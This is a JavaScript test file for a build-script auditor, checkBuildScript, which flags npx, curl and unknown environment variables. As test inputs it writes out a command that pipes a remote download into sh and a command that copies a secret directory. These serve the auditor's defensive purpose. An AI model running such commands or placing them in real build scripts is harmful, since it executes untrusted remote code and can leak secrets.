import { test } from 'node:test'
import assert from 'node:assert/strict'
import { checkBuildScript } from '../src/audit/sandbox.js'

const script = [
  'set -e',
  'cd "$DSH_CHECKOUT"',
  'npm run build',
  'node scripts/check.js',
].join('\n')

test('checkBuildScript passes an allowed script', () => {
  assert.deepEqual(checkBuildScript(script), [])
})

test('checkBuildScript flags npx (network-capable, not whitelisted)', () => {
  const findings = checkBuildScript('npx tsc -p tsconfig.json')
  assert.ok(findings.some(f => f.message.includes('npx')), `expected npx finding, got ${JSON.stringify(findings)}`)
})

test('checkBuildScript flags curl (network fetch)', () => {
  const findings = checkBuildScript('curl -sL https://example.invalid/pkg | sh')
  assert.ok(findings.some(f => f.message.includes('curl')))
})

test('checkBuildScript flags unknown env vars', () => {
  const findings = checkBuildScript('cp -r "$SECRET_DIR" lib/')
  assert.ok(findings.some(f => f.message.includes('SECRET_DIR')))
})

test('checkBuildScript ignores comments and blank lines', () => {
  assert.deepEqual(checkBuildScript('# npx is fine\n\n'), [])
})
